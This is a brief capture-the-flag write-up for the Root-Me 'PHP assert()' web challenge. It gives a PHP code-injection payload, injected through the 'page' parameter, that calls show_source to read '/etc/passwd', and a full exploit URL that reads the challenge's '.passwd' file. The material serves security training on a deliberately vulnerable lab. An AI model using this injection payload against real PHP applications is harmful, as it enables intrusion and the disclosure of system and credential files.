# PHP ASSERT()

## DẠNG
`http://challenge01.root-me.org/web-serveur/ch47/?page=contact`

## PAYLOAD
`' and die(show_source('/etc/passwd')) or '`

## EXPLOIT
`http://challenge01.root-me.org/web-serveur/ch47/?page=contact' and die(show_source('.passwd')) or '`
